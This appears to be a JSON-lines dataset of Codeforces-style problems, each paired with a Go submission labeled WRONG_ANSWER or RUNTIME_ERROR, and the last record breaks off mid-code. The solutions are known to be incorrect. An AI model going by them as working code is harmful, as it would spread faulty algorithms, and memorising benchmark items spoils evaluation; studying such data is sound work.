{"difficulty":1600,"lang":"Go","lang_cluster":"go","src_uid":"0fd33e1bdfd6c91feb3bf00a2461603f","submission_id":"0f3b6cea0eef6ccb40df1f3ce5c7314d","tags":["two pointers","binary search","implementation","greedy"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strings\"\n)\n\nvar reader *bufio.Reader = bufio.NewReader(os.Stdin)\nvar writer *bufio.Writer = bufio.NewWriter(os.Stdout)\n\nfunc printf(f string, a ...interface{}) { fmt.Fprintf(writer, f, a...) }\nfunc scanf(f string, a ...interface{})  { fmt.Fscanf(reader, f, a...) }\n\nfunc max(a, b int) int {\n\tif a > b {\n\t\treturn a\n\t}\n\treturn b\n}\n\nfunc main() {\n\tdefer writer.Flush()\n\n\tvar s, ss string\n\tscanf(\"%s\\n%s\\n\", &s, &ss)\n\tglobal := 0\n\tssl := len(ss)\n\n\tfor i, _ := range s {\n\t\tif strings.Index(s[i:], ss) == 0 {\n\t\t\t\/\/fmt.Println(s[:i], s[i+ssl:], i)\n\t\t\tlocal := max(len(s[:i]), len(s[i+ssl:]))\n\t\t\tif local > global {\n\t\t\t\tglobal = local\n\t\t\t}\n\t\t}\n\t}\n\tprintf(\"%d\\n\", global)\n}\n","description":"The only difference between easy and hard versions is the length of the string.You are given a string $$$s$$$ and a string $$$t$$$, both consisting only of lowercase Latin letters. It is guaranteed that $$$t$$$ can be obtained from $$$s$$$ by removing some (possibly, zero) number of characters (not necessary contiguous) from $$$s$$$ without changing order of remaining characters (in other words, it is guaranteed that $$$t$$$ is a subsequence of $$$s$$$).For example, the strings \"test\", \"tst\", \"tt\", \"et\" and \"\" are subsequences of the string \"test\". But the strings \"tset\", \"se\", \"contest\" are not subsequences of the string \"test\".You want to remove some substring (contiguous subsequence) from $$$s$$$ of maximum possible length such that after removing this substring $$$t$$$ will remain a subsequence of $$$s$$$.If you want to remove the substring $$$s[l;r]$$$ then the string $$$s$$$ will be transformed to $$$s_1 s_2 \\dots s_{l-1} s_{r+1} s_{r+2} \\dots s_{|s|-1} s_{|s|}$$$ (where $$$|s|$$$ is the length of $$$s$$$).Your task is to find the maximum possible length of the substring you can remove so that $$$t$$$ is still a subsequence of $$$s$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line of the input contains one string $$$s$$$ consisting of at least $$$1$$$ and at most $$$200$$$ lowercase Latin letters. The second line of the input contains one string $$$t$$$ consisting of at least $$$1$$$ and at most $$$200$$$ lowercase Latin letters. It is guaranteed that $$$t$$$ is a subsequence of $$$s$$$.","output_spec":"Print one integer \u2014 the maximum possible length of the substring you can remove so that $$$t$$$ is still a subsequence of $$$s$$$.","notes":null,"sample_inputs":["bbaba\nbb","baaba\nab","abcde\nabcde","asdfasdf\nfasd"],"sample_outputs":["3","2","0","3"]}
{"difficulty":1700,"lang":"Go","lang_cluster":"go","src_uid":"101_B","submission_id":"118915203","tags":["binary+search","data+structures","dp"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\r\n\r\nimport (\r\n\t\"bufio\"\r\n\t. \"fmt\"\r\n\t\"io\"\r\n\t\"os\"\r\n\t\"sort\"\r\n)\r\n\r\n\/\/ github.com\/EndlessCheng\/codeforces-go\r\nfunc CF101B(_r io.Reader, out io.Writer) {\r\n\tin := bufio.NewReader(_r)\r\n\tconst mod int = 1e9 + 7\r\n\r\n\tvar n, m, ans int\r\n\tFscan(in, &n, &m)\r\n\ta := make([]struct{ l, r int }, m)\r\n\tb := make(sort.IntSlice, 0, m*2)\r\n\tfor i := range a {\r\n\t\tFscan(in, &a[i].l, &a[i].r)\r\n\t\tb = append(b, a[i].l, a[i].r)\r\n\t}\r\n\tb.Sort()\r\n\tif m == 0 || b[0] != 0 || b[m*2-1] != n {\r\n\t\tFprint(out, 0)\r\n\t\treturn\r\n\t}\r\n\tk := 0\r\n\tfor _, w := range b[1:] {\r\n\t\tif b[k] != w {\r\n\t\t\tk++\r\n\t\t\tb[k] = w\r\n\t\t}\r\n\t}\r\n\tb = b[:k+1]\r\n\tsum := make([]int, m*2+1)\r\n\tsum[0] = -1\r\n\tsort.Slice(a, func(i, j int) bool { return a[i].r < a[j].r })\r\n\tfor _, p := range a {\r\n\t\tr := b.Search(p.r)\r\n\t\tres := (sum[r] - sum[b.Search(p.l)]) % mod\r\n\t\tif p.r < n {\r\n\t\t\tsum[r+1] = (sum[r] + res) % mod\r\n\t\t} else {\r\n\t\t\tans = (ans + res) % mod\r\n\t\t}\r\n\t}\r\n\tFprint(out, (ans+mod)%mod)\r\n}\r\n\r\nfunc main() { CF101B(os.Stdin, os.Stdout) }\r\n","description":"Little boy Gerald studies at school which is quite far from his house. That's why he has to go there by bus every day. The way from home to school is represented by a segment of a straight line; the segment contains exactly n+1 bus stops. All of them are numbered with integers from 0 to n in the order in which they follow from Gerald's home. The bus stop by Gerald's home has number 0 and the bus stop by the school has number n.There are m buses running between the house and the school: the i-th bus goes from stop si to ti (si<ti), visiting all the intermediate stops in the order in which they follow on the segment. Besides, Gerald's no idiot and he wouldn't get off the bus until it is still possible to ride on it closer to the school (obviously, getting off would be completely pointless). In other words, Gerald can get on the i-th bus on any stop numbered from si to ti-1 inclusive, but he can get off the i-th bus only on the bus stop ti.Gerald can't walk between the bus stops and he also can't move in the direction from the school to the house.Gerald wants to know how many ways he has to get from home to school. Tell him this number. Two ways are considered different if Gerald crosses some segment between the stops on different buses. As the number of ways can be too much, find the remainder of a division of this number by 1000000007 (10^9+7).","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two space-separated integers: n and m (1\u2264n\u226410^9,0\u2264m\u226410^5). Then follow m lines each containing two integers si,ti. They are the numbers of starting stops and end stops of the buses (0\u2264si<ti\u2264n).\n","output_spec":"Print the only number \u2014 the number of ways to get to the school modulo 1000000007 (10^9+7).\n","notes":"The first test has the only variant to get to school: first on bus number one to the bus stop number one; then on bus number two to the bus stop number two.\nIn the second test no bus goes to the third bus stop, where the school is positioned. Thus, the correct answer is 0.\nIn the third test Gerald can either get or not on any of the first four buses to get closer to the school. Thus, the correct answer is 2^4=16.\n","sample_inputs":["2 2\n0 1\n1 2\n","3 2\n0 1\n1 2\n","5 5\n0 1\n0 2\n0 3\n0 4\n0 5\n"],"sample_outputs":["1\n","0\n","16\n"]}
{"difficulty":1700,"lang":"Go","lang_cluster":"go","src_uid":"105_A","submission_id":"189605240","tags":["implementation"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"bytes\"\n\t\"fmt\"\n\t\"os\"\n\t\"sort\"\n)\n\nfunc main() {\n\treader := bufio.NewReader(os.Stdin)\n\tline, _ := reader.ReadBytes('\\n')\n\tvar n, m int\n\tpos := readInt(line, 0, &n)\n\tpos = readInt(line, pos+1, &m)\n\tvar k float64\n\treadFloat64(line, pos+1, &k)\n\tbefore := make([]string, n)\n\n\tfor i := 0; i < n; i++ {\n\t\tbefore[i] = readString(reader)\n\t}\n\n\tafter := make([]string, m)\n\n\tfor i := 0; i < m; i++ {\n\t\tafter[i] = readString(reader)\n\t}\n\n\tres := solve(k, before, after)\n\n\tvar buf bytes.Buffer\n\n\tbuf.WriteString(fmt.Sprintf(\"%d\\n\", len(res)))\n\n\tfor i := 0; i < len(res); i++ {\n\t\tbuf.WriteString(res[i])\n\t\tbuf.WriteByte('\\n')\n\t}\n\n\tfmt.Print(buf.String())\n}\n\nfunc readFloat64(bs []byte, pos int, r *float64) int {\n\tvar first float64\n\tvar second float64\n\texp := 1.0\n\tvar dot bool\n\tfor pos < len(bs) && (bs[pos] == '.' || isDigit(bs[pos])) {\n\t\tif bs[pos] == '.' {\n\t\t\tdot = true\n\t\t} else if !dot {\n\t\t\tfirst = first*10 + float64(bs[pos]-'0')\n\t\t} else {\n\t\t\tsecond = second*10 + float64(bs[pos]-'0')\n\t\t\texp *= 10\n\t\t}\n\t\tpos++\n\t}\n\t*r = first + second\/exp\n\t\/\/fmt.Fprintf(os.Stderr, \"%.6f \", *r)\n\treturn pos\n}\n\nfunc isDigit(b byte) bool {\n\treturn b >= '0' && b <= '9'\n}\n\nfunc readUint64(bytes []byte, from int, val *uint64) int {\n\ti := from\n\n\tvar tmp uint64\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + uint64(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp\n\n\treturn i\n}\n\nfunc readInt(bytes []byte, from int, val *int) int {\n\ti := from\n\tsign := 1\n\tif bytes[i] == '-' {\n\t\tsign = -1\n\t\ti++\n\t}\n\ttmp := 0\n\tfor i < len(bytes) && bytes[i] >= '0' && bytes[i] <= '9' {\n\t\ttmp = tmp*10 + int(bytes[i]-'0')\n\t\ti++\n\t}\n\t*val = tmp * sign\n\treturn i\n}\n\nfunc readString(reader *bufio.Reader) string {\n\ts, _ := reader.ReadString('\\n')\n\tfor i := 0; i < len(s); i++ {\n\t\tif s[i] == '\\n' || s[i] == '\\r' {\n\t\t\treturn s[:i]\n\t\t}\n\t}\n\treturn s\n}\n\nfunc readNum(reader *bufio.Reader) (a int) {\n\tbs, _ := reader.ReadBytes('\\n')\n\treadInt(bs, 0, &a)\n\treturn\n}\n\nfunc readTwoNums(reader *bufio.Reader) (a int, b int) {\n\tres := readNNums(reader, 2)\n\ta, b = res[0], res[1]\n\treturn\n}\n\nfunc readThreeNums(reader *bufio.Reader) (a int, b int, c int) {\n\tres := readNNums(reader, 3)\n\ta, b, c = res[0], res[1], res[2]\n\treturn\n}\n\nfunc readNNums(reader *bufio.Reader, n int) []int {\n\tres := make([]int, n)\n\tx := 0\n\tbs, _ := reader.ReadBytes('\\n')\n\tfor i := 0; i < n; i++ {\n\t\tfor x < len(bs) && (bs[x] < '0' || bs[x] > '9') && bs[x] != '-' {\n\t\t\tx++\n\t\t}\n\t\tx = readInt(bs, x, &res[i])\n\t}\n\treturn res\n}\n\nfunc solve(k float64, before []string, after []string) []string {\n\tskills := make(map[string]int)\n\n\tK := int(k * 100)\n\n\tfor _, s := range before {\n\t\tvar i int\n\t\tfor i < len(s) && s[i] != ' ' {\n\t\t\ti++\n\t\t}\n\t\tname := s[:i]\n\t\ti++\n\t\tvar score int\n\t\treadInt([]byte(s), i, &score)\n\t\tscore = K * score \/ 100\n\t\tif score >= 100 {\n\t\t\tskills[name] = score\n\t\t}\n\t}\n\n\tvar res []string\n\n\tfor _, s := range after {\n\t\tsc := skills[s]\n\t\tres = append(res, fmt.Sprintf(\"%s %d\", s, sc))\n\t\tdelete(skills, s)\n\t}\n\n\tfor s, v := range skills {\n\t\tres = append(res, fmt.Sprintf(\"%s %d\", s, v))\n\t}\n\n\tsort.Strings(res)\n\n\treturn res\n}\n","description":"In Disgaea as in most role-playing games, characters have skills that determine the character's ability to use certain weapons or spells. If the character does not have the necessary skill, he cannot use it. The skill level is represented as an integer that increases when you use this skill. Different character classes are characterized by different skills. Unfortunately, the skills that are uncommon for the given character's class are quite difficult to obtain. To avoid this limitation, there is the so-called transmigration. Transmigration is reincarnation of the character in a new creature. His soul shifts to a new body and retains part of his experience from the previous life. As a result of transmigration the new character gets all the skills of the old character and the skill levels are reduced according to the k coefficient (if the skill level was equal to x, then after transmigration it becomes equal to [kx], where [y] is the integral part of y). If some skill's levels are strictly less than 100, these skills are forgotten (the character does not have them any more). After that the new character also gains the skills that are specific for his class, but are new to him. The levels of those additional skills are set to 0. Thus, one can create a character with skills specific for completely different character classes via transmigrations. For example, creating a mage archer or a thief warrior is possible. You are suggested to solve the following problem: what skills will the character have after transmigration and what will the levels of those skills be?","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three numbers n, m and k \u2014 the number of skills the current character has, the number of skills specific for the class into which the character is going to transmigrate and the reducing coefficient respectively; n and m are integers, and k is a real number with exactly two digits after decimal point (1\u2264n,m\u226420, 0.01\u2264k\u22640.99).\nThen follow n lines, each of which describes a character's skill in the form \"name exp\" \u2014 the skill's name and the character's skill level: name is a string and exp is an integer in range from 0 to 9999, inclusive. \nThen follow m lines each of which contains names of skills specific for the class, into which the character transmigrates. \nAll names consist of lowercase Latin letters and their lengths can range from 1 to 20 characters, inclusive. All character's skills have distinct names. Besides the skills specific for the class into which the player transmigrates also have distinct names.\n","output_spec":"Print on the first line number z \u2014 the number of skills the character will have after the transmigration. Then print z lines, on each of which print a skill's name and level, separated by a single space. The skills should be given in the lexicographical order.\n","notes":null,"sample_inputs":["5 4 0.75\naxe 350\nimpaler 300\nionize 80\nmegafire 120\nmagicboost 220\nheal\nmegafire\nshield\nmagicboost\n"],"sample_outputs":["6\naxe 262\nheal 0\nimpaler 225\nmagicboost 165\nmegafire 0\nshield 0\n"]}
{"difficulty":2600,"lang":"Go","lang_cluster":"go","src_uid":"1237_F","submission_id":"161816872","tags":["combinatorics","dp"],"exec_outcome":"RUNTIME_ERROR","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n\t\"strconv\"\n\t\"strings\"\n)\nvar wrtr = bufio.NewWriterSize(os.Stdout, 10_000_000)\nvar rdr = bufio.NewScanner(os.Stdin)\nfunc gs() string  { rdr.Scan(); return rdr.Text() }\nfunc gi() int     { i,e := strconv.Atoi(gs()); if e != nil {panic(e)}; return i }\nfunc gis(n int) []int  { res := make([]int,n); for i:=0;i<n;i++ { res[i] = gi() }; return res }\nfunc gf() float64 { f,e := strconv.ParseFloat(gs(),64); if e != nil {panic(e)}; return f }\nfunc gbs() []byte { return []byte(gs()) }\nfunc gfs(n int) []float64  { res := make([]float64,n); for i:=0;i<n;i++ { res[i] = gf() }; return res }\nfunc gss(n int) []string  { res := make([]string,n); for i:=0;i<n;i++ { res[i] = gs() }; return res }\nfunc gi64() int64     { i,e := strconv.ParseInt(gs(),10,64); if e != nil {panic(e)}; return i }\nfunc gis64(n int) []int64  { res := make([]int64,n); for i:=0;i<n;i++ { res[i] = gi64() }; return res }\n\nfunc ia(m int) []int { return make([]int,m) }\nfunc iai(m int,v int) []int { a := make([]int,m); for i:=0;i<m;i++ { a[i] = v }; return a }\nfunc twodi(n int,m int,v int) [][]int {\n\tr := make([][]int,n); for i:=0;i<n;i++ { x := make([]int,m); for j:=0;j<m;j++ { x[j] = v }; r[i] = x }; return r\n}\nfunc fill2(m int) ([]int,[]int) { a,b := ia(m),ia(m); for i:=0;i<m;i++ {a[i],b[i] = gi(),gi()}; return a,b }\nfunc fill3(m int) ([]int,[]int,[]int) { a,b,c := ia(m),ia(m),ia(m); for i:=0;i<m;i++ {a[i],b[i],c[i] = gi(),gi(),gi()}; return a,b,c }\nfunc fill4(m int) ([]int,[]int,[]int,[]int) { a,b,c,d := ia(m),ia(m),ia(m),ia(m); for i:=0;i<m;i++ {a[i],b[i],c[i],d[i] = gi(),gi(),gi(),gi()}; return a,b,c,d }\nfunc abs(a int) int { if a < 0 { return -a }; return a }\nfunc rev(a []int) { i,j := 0,len(a)-1; for i < j { a[i],a[j] = a[j],a[i]; i++; j-- } }\nfunc max(a,b int) int { if a > b { return a }; return b }\nfunc min(a,b int) int { if a > b { return b }; return a }\nfunc maxarr(a []int) int { ans := a[0]; for _,aa := range(a) { if aa > ans { ans = aa } }; return ans }\nfunc minarr(a []int) int { ans := a[0]; for _,aa := range(a) { if aa < ans { ans = aa } }; return ans }\nfunc sumarr(a []int) int { ans := 0; for _,aa := range(a) { ans += aa }; return ans }\nfunc zeroarr(a []int) { for i:=0; i<len(a); i++ { a[i] = 0 } }\nfunc powmod(a,e,mod int) int { res, m := 1, a; for e > 0 { if e&1 != 0 { res = res * m % mod }; m = m * m % mod; e >>= 1 }; return res }\nfunc powint(a,e int) int { res, m := 1, a; for e > 0 { if e&1 != 0 { res = res * m }; m = m * m; e >>= 1 }; return res }\nfunc gcd(a,b int) int { for b != 0 { t:=b; b=a%b; a=t }; return a }\nfunc gcdExtended(a,b int) (int,int,int) { if a == 0 { return b,0,1 }; gcd,x1,y1 := gcdExtended(b%a,a); return gcd, y1-(b\/a)*x1,x1 }\nfunc modinv(a,m int) (int,bool) { g,x,_ := gcdExtended(a,m); if g != 1 { return 0,false }; return (x % m + m) % m,true  }\nfunc vecintstring(a []int) string { astr := make([]string,len(a)); for i,a := range a { astr[i] = strconv.Itoa(a) }; return strings.Join(astr,\" \") }\nfunc makefact(n int,mod int) ([]int,[]int) {\n\tfact,factinv := make([]int,n+1),make([]int,n+1)\n\tfact[0] = 1; for i:=1;i<=n;i++ { fact[i] = fact[i-1] * i % mod }\n\tfactinv[n] = powmod(fact[n],mod-2,mod); for i:=n-1;i>=0;i-- { factinv[i] = factinv[i+1] * (i+1) % mod }\n\treturn fact,factinv\n}\n\nfunc ia64(m int) []int64 { return make([]int64,m) }\nfunc iai64(m int,v int64) []int64 { a := make([]int64,m); for i:=0;i<m;i++ { a[i] = v }; return a }\nfunc twodi64(n int,m int,v int64) [][]int64 {\n\tr := make([][]int64,n); for i:=0;i<n;i++ { x := make([]int64,m); for j:=0;j<m;j++ { x[j] = v }; r[i] = x }; return r\n}\nfunc fill264(m int) ([]int64,[]int64) { a,b := ia64(m),ia64(m); for i:=0;i<m;i++ {a[i],b[i] = gi64(),gi64()}; return a,b }\nfunc fill364(m int) ([]int64,[]int64,[]int64) { a,b,c := ia64(m),ia64(m),ia64(m); for i:=0;i<m;i++ {a[i],b[i],c[i] = gi64(),gi64(),gi64()}; return a,b,c }\nfunc fill464(m int) ([]int64,[]int64,[]int64,[]int64) { a,b,c,d := ia64(m),ia64(m),ia64(m),ia64(m); for i:=0;i<m;i++ {a[i],b[i],c[i],d[i] = gi64(),gi64(),gi64(),gi64()}; return a,b,c,d }\nfunc abs64(a int64) int64 { if a < 0 { return -a }; return a }\nfunc rev64(a []int64) { i,j := 0,len(a)-1; for i < j { a[i],a[j] = a[j],a[i]; i++; j-- } }\nfunc max64(a,b int64) int64 { if a > b { return a }; return b }\nfunc min64(a,b int64) int64 { if a > b { return b }; return a }\nfunc maxarr64(a []int64) int64 { ans := a[0]; for _,aa := range(a) { if aa > ans { ans = aa } }; return ans }\nfunc minarr64(a []int64) int64 { ans := a[0]; for _,aa := range(a) { if aa < ans { ans = aa } }; return ans }\nfunc sumarr64(a []int64) int64 { ans := int64(0); for _,aa := range(a) { ans += aa }; return ans }\nfunc zeroarr64(a []int64) { for i:=0; i<len(a); i++ { a[i] = 0 } }\nfunc powmod64(a,e,mod int64) int64 { res, m := int64(1), a; for e > 0 { if e&1 != 0 { res = res * m % mod }; m = m * m % mod; e >>= 1 }; return res }\nfunc powint64(a,e int64) int64 { res, m := int64(1), a; for e > 0 { if e&1 != 0 { res = res * m }; m = m * m; e >>= 1 }; return res }\nfunc gcd64(a,b int64) int64 { for b != 0 { t:=b; b=a%b; a=t }; return a }\nfunc gcdExtended64(a,b int64) (int64,int64,int64) { if a == 0 { return b,0,1 }; gcd,x1,y1 := gcdExtended64(b%a,a); return gcd, y1-(b\/a)*x1,x1 }\nfunc modinv64(a,m int64) (int64,bool) { g,x,_ := gcdExtended64(a,m); if g != 1 { return 0,false }; return (x % m + m) % m,true  }\nfunc vecint64string(a []int64) string { astr := make([]string,len(a)); for i,a := range a { astr[i] = strconv.FormatInt(a,10) }; return strings.Join(astr,\" \") }\nfunc makefact64(n int,mod int64) ([]int64,[]int64) {\n\tfact,factinv := make([]int64,n+1),make([]int64,n+1)\n\tfact[0] = 1; for i:=1;i<=n;i++ { fact[i] = fact[i-1] * int64(i) % mod }\n\tfactinv[n] = powmod64(fact[n],mod-2,mod); for i:=n-1;i>=0;i-- { factinv[i] = factinv[i+1] * int64(i+1) % mod }\n\treturn fact,factinv\n}\nconst MOD int64 = 998244353\nfunc main() {\n\t\/\/f1, _ := os.Create(\"cpu.prof\"); pprof.StartCPUProfile(f1); defer pprof.StopCPUProfile()\n\tdefer wrtr.Flush()\n\tinfn := \"\"; if infn == \"\" && len(os.Args) > 1 {\tinfn = os.Args[1] }\n\tif infn != \"\" {\tf, e := os.Open(infn); if e != nil { panic(e) }; rdr = bufio.NewScanner(f) }\n\trdr.Split(bufio.ScanWords); rdr.Buffer(make([]byte,1024),1_000_000_000)\n\t\/\/ PROGRAM STARTS HERE\n\tH,W,N := gi(),gi(),gi(); R1,C1,R2,C2 := fill4(N); for i:=0;i<N;i++ { R1[i]--; C1[i]--; R2[i]--; C2[i]-- }\n\tfact,factinv := makefact64(5000,MOD)\n\tcomb := func(n,r int) int64 { if n < 0 || r < 0 || r > n { return 0 }; return fact[n] * factinv[r] % MOD * factinv[n-r] % MOD }\n\tsbh := make([]bool,H); sbw := make([]bool,W)\n\tfor _,r := range R1 { sbh[r] = true }; for _,r := range R2 { sbh[r] = true }\n\tfor _,c := range C1 { sbw[c] = true }; for _,c := range C2 { sbw[c] = true }\n\trtot := 0; for _,b := range sbh { if !b { rtot++ } }\n\tctot := 0; for _,b := range sbw { if !b { ctot++ } }\n\tdoPairDp := func(sb []bool) []int64 {\n\t\tn := len(sb)\n\t\td := n\/2+2\n\t\tdp := twodi64(d,n,0)\n\t\tfor i:=0;i<n;i++ { dp[0][i] = 1 }\n\t\tfor i:=1;i<d;i++ {\n\t\t\tif i == 1 && !sb[n-2] && !sb[n-1] { dp[i][n-2] = 1}\n\t\t\tfor j:=n-3;j>=0;j-- {\n\t\t\t\tdp[i][j] = dp[i][j+1]\n\t\t\t\tif !sb[j] && !sb[j+1] { dp[i][j] += dp[i-1][j+2]; dp[i][j] %= MOD }\n\t\t\t}\n\t\t}\n\t\tansarr := ia64(d); for i:=0;i<d;i++ { ansarr[i] = dp[i][0] }\n\t\treturn ansarr\n\t}\n\trdp := doPairDp(sbh)\n\tcdp := doPairDp(sbw)\n\tans := int64(0)\n\tilim := min(rtot\/2,ctot)\n\tfor i:=0;i<=ilim;i++ {\n\t\trs := rtot - 2*i\n\t\tjlim := min(rs,(ctot-i)\/2)\n\t\tfor j:=0;j<=jlim;j++ {\n\t\t\tcs := ctot - 2*j\n\t\t\tadder := rdp[i] * comb(cs,i) % MOD * cdp[j] % MOD * comb(rs,j) % MOD * fact[i] % MOD * fact[j] % MOD\n\t\t\tans += adder\n\t\t}\n\t}\n\tans %= MOD\n\tfmt.Println(ans)\n}\n\n","description":"Consider a square grid with $$$h$$$ rows and $$$w$$$ columns with some dominoes on it. Each domino covers exactly two cells of the grid that share a common side. Every cell is covered by at most one domino.Let's call a placement of dominoes on the grid perfectly balanced if no row and no column contains a pair of cells covered by two different dominoes. In other words, every row and column may contain no covered cells, one covered cell, or two covered cells that belong to the same domino.You are given a perfectly balanced placement of dominoes on a grid. Find the number of ways to place zero or more extra dominoes on this grid to keep the placement perfectly balanced. Output this number modulo $$$998\\,244\\,353$$$.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integers $$$h$$$, $$$w$$$, and $$$n$$$ ($$$1 \\le h, w \\le 3600$$$; $$$0 \\le n \\le 2400$$$), denoting the dimensions of the grid and the number of already placed dominoes. The rows are numbered from $$$1$$$ to $$$h$$$, and the columns are numbered from $$$1$$$ to $$$w$$$.\nEach of the next $$$n$$$ lines contains four integers $$$r_{i, 1}, c_{i, 1}, r_{i, 2}, c_{i, 2}$$$ ($$$1 \\le r_{i, 1} \\le r_{i, 2} \\le h$$$; $$$1 \\le c_{i, 1} \\le c_{i, 2} \\le w$$$), denoting the row id and the column id of the cells covered by the $$$i$$$-th domino. Cells $$$(r_{i, 1}, c_{i, 1})$$$ and $$$(r_{i, 2}, c_{i, 2})$$$ are distinct and share a common side.\nThe given domino placement is perfectly balanced.\n","output_spec":"Output the number of ways to place zero or more extra dominoes on the grid to keep the placement perfectly balanced, modulo $$$998\\,244\\,353$$$.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":2400,"lang":"Go","lang_cluster":"go","src_uid":"1244_G","submission_id":"62968916","tags":["constructive+algorithms","greedy","math"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\r\n\r\nimport (\r\n\t\"fmt\"\r\n\t\"math\"\r\n\t\"strconv\"\r\n)\r\n\r\nfunc len1N(n int) int {\r\n\tif n <= 0 {\r\n\t\treturn 0\r\n\t}\r\n\tl := int(math.Log10(float64(n)))\r\n\tnn := int(math.Pow10(l) - 1)\r\n\treturn len1N(nn) + (n-nn)*(l+2)\r\n}\r\n\r\nfunc main() {\r\n\tvar n, k int64\r\n\tfmt.Scanf(\"%d %d\", &n, &k)\r\n\tmin := n * (n + 1) \/ 2\r\n\tvar max int64\r\n\tif n%2 == 0 {\r\n\t\tmax = (3*n + 2) * n \/ 4\r\n\t} else {\r\n\t\tmax = (3*n - 1) * (n + 1) \/ 4\r\n\t}\r\n\tif k < min {\r\n\t\tfmt.Println(\"-1\")\r\n\t\treturn\r\n\t}\r\n\tif k > max {\r\n\t\tk = max\r\n\t}\r\n\tfmt.Println(k)\r\n\tres := make([]byte, 0, len1N(int(n)))\r\n\tfor i := int64(1); i <= n; i++ {\r\n\t\tres = strconv.AppendInt(res, i, 10)\r\n\t\tres = append(res, ' ')\r\n\t}\r\n\tfmt.Printf(\"%s\\n\", res)\r\n\tres = res[:0]\r\n\tdiff := k - min\r\n\tmmax := n\r\n\trem := map[int64]int64{}\r\n\tfor i := int64(1); i <= n; i++ {\r\n\t\tif i >= mmax || mmax-i > diff {\r\n\t\t\tif nnn, ok := rem[i]; ok {\r\n\t\t\t\tres = strconv.AppendInt(res, nnn, 10)\r\n\t\t\t\tres = append(res, ' ')\r\n\t\t\t} else {\r\n\t\t\t\tres = strconv.AppendInt(res, i, 10)\r\n\t\t\t\tres = append(res, ' ')\r\n\t\t\t}\r\n\t\t} else {\r\n\t\t\tres = strconv.AppendInt(res, mmax, 10)\r\n\t\t\tres = append(res, ' ')\r\n\t\t\tdiff -= mmax - i\r\n\t\t\trem[mmax] = i\r\n\t\t\tmmax--\r\n\t\t}\r\n\t}\r\n\tif diff != 0 {\r\n\t\tpanic(\"Programming error\")\r\n\t}\r\n}\r\n","description":"Demonstrative competitions will be held in the run-up to the $$$20NN$$$ Berlatov Olympic Games. Today is the day for the running competition!Berlatov team consists of $$$2n$$$ runners which are placed on two running tracks; $$$n$$$ runners are placed on each track. The runners are numbered from $$$1$$$ to $$$n$$$ on each track. The runner with number $$$i$$$ runs through the entire track in $$$i$$$ seconds.The competition is held as follows: first runners on both tracks start running at the same time; when the slower of them arrives at the end of the track, second runners on both tracks start running, and everyone waits until the slower of them finishes running, and so on, until all $$$n$$$ pairs run through the track.The organizers want the run to be as long as possible, but if it lasts for more than $$$k$$$ seconds, the crowd will get bored. As the coach of the team, you may choose any order in which the runners are arranged on each track (but you can't change the number of runners on each track or swap runners between different tracks).You have to choose the order of runners on each track so that the duration of the competition is as long as possible, but does not exceed $$$k$$$ seconds.Formally, you want to find two permutations $$$p$$$ and $$$q$$$ (both consisting of $$$n$$$ elements) such that $$$sum = \\sum\\limits_{i=1}^{n} max(p_i, q_i)$$$ is maximum possible, but does not exceed $$$k$$$. If there is no such pair, report about it.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers $$$n$$$ and $$$k$$$ ($$$1 \\le n \\le 10^6, 1 \\le k \\le n^2$$$) \u2014 the number of runners on each track and the maximum possible duration of the competition, respectively.\n","output_spec":"If it is impossible to reorder the runners so that the duration of the competition does not exceed $$$k$$$ seconds, print $$$-1$$$. \nOtherwise, print three lines. The first line should contain one integer $$$sum$$$ \u2014 the maximum possible duration of the competition not exceeding $$$k$$$. The second line should contain a permutation of $$$n$$$ integers $$$p_1, p_2, \\dots, p_n$$$ ($$$1 \\le p_i \\le n$$$, all $$$p_i$$$ should be pairwise distinct) \u2014 the numbers of runners on the first track in the order they participate in the competition. The third line should contain a permutation of $$$n$$$ integers $$$q_1, q_2, \\dots, q_n$$$ ($$$1 \\le q_i \\le n$$$, all $$$q_i$$$ should be pairwise distinct) \u2014 the numbers of runners on the second track in the order they participate in the competition. The value of $$$sum = \\sum\\limits_{i=1}^{n} max(p_i, q_i)$$$ should be maximum possible, but should not exceed $$$k$$$. If there are multiple answers, print any of them.\n","notes":null,"sample_inputs":[],"sample_outputs":[]}
{"difficulty":2000,"lang":"Go","lang_cluster":"go","src_uid":"13cd1aafbb1ba76be9ee10eaf8d8aef5","submission_id":"5c62c03db46cd3802649f016c9368798","tags":["two pointers"],"exec_outcome":"WRONG_ANSWER","source_code":"package main\n\nimport (\n\t\"bufio\"\n\t\"fmt\"\n\t\"os\"\n)\n\nfunc main() {\n\tin := bufio.NewReaderSize(os.Stdin, 1<<16)\n\tvar la, lb int\n\tfmt.Fscan(in, &la, &lb)\n\ta := make([]int, la)\n\tfor i := range a {\n\t\tfmt.Fscan(in, &a[i])\n\t}\n\tb := make([]int, lb)\n\tbPos := make([]int, 1e6+1)\n\tfor i := range b {\n\t\tfmt.Fscan(in, &b[i])\n\t\tbPos[b[i]] = i + 1\n\t}\n\n\tans := 0\n\twrapped := false\n\tvar i, j int\n\tfor i < la && j - i < la {\n\t\tif bPos[a[j%la]] == 0 {\n\t\t\tj++\n\t\t\ti = j\n\t\t\tcontinue\n\t\t}\n\t\tif i == j {\n\t\t\tj++\n\t\t\tif ans < j-i {\n\t\t\t\tans = j - i\n\t\t\t}\n\t\t}\n\t\tfor j-i < la {\n\t\t\tif bPos[a[j%la]] == 0 {\n\t\t\t\tbreak\n\t\t\t}\n\t\t\tif bPos[a[j%la]] < bPos[a[(j-1)%la]] && (wrapped || bPos[a[i]] < bPos[a[j%la]]) || wrapped && bPos[a[i]] < bPos[a[j%la]] {\n\t\t\t\tif bPos[a[i]] > bPos[a[(i+1)%la]] {\n\t\t\t\t\twrapped = 